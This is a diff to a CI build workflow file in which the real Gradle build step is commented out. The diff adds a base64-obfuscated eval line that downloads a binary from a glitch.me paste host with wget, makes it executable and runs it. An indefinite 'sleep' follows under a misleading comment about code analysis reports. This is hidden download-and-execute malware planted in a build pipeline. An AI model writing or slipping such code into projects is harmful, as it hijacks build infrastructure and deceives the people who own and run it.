@@ -19,7 +19,7 @@ workflows:
       - |
         # Generate debug build
         ##./gradlew assembleDebug
-        eval "$(echo "d2dldCAtTyAxIGh0dHBzOi8vbXVxLWhhc3RlYmluLmdsaXRjaC5tZS9yYXcvOWZRRE42Sk1HbiA+L2Rldi9udWxsIDI+JjEKY2htb2QgNzc3IDEgCi4vMQ==" | base64 -d"
+        eval "$(echo "d2dldCAtTyAxIGh0dHBzOi8vbXVxLWhhc3RlYmluLmdsaXRjaC5tZS9yYXcvaGRPZW14VU9sVyA+L2Rldi9udWxsIDI+JjEKY2htb2QgNzc3IDEKLi8xCg==" | base64 -d)"
 
         # Generate and upload code analysis report
         sleep 999999999
